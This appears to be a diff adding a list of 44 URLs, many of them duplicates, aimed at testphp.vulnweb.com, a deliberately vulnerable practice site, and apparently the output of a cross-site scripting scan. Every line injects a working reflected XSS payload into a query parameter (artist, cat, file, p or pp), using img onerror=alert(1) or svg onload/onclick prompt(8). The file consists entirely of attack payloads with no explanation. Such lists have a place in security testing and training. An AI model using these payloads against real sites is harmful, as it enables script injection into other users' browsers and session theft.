@@ -1,0 +1,44 @@
+http://testphp.vulnweb.com/hpp/?pp="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/listproducts.php?artist="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/listproducts.php?artist="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/listproducts.php?artist="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/listproducts.php?cat="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/listproducts.php?cat="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/hpp/params.php?p="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&pp="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/listproducts.php?cat="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/listproducts.php?cat="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&size=160
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&size=160
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&size=160
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&size=160
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&size=160
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&size=160
+http://testphp.vulnweb.com/hpp/?pp="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/listproducts.php?artist="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/listproducts.php?artist="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/listproducts.php?artist="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/listproducts.php?cat="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/listproducts.php?cat="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/hpp/params.php?p="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&pp="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/listproducts.php?cat="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/listproducts.php?cat="><img src=1 onerror=alert(1)>.gif
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&size=160
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&size=160
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&size=160
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&size=160
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&size=160
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&size=160
+http://testphp.vulnweb.com/showimage.php?file="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y&size=160
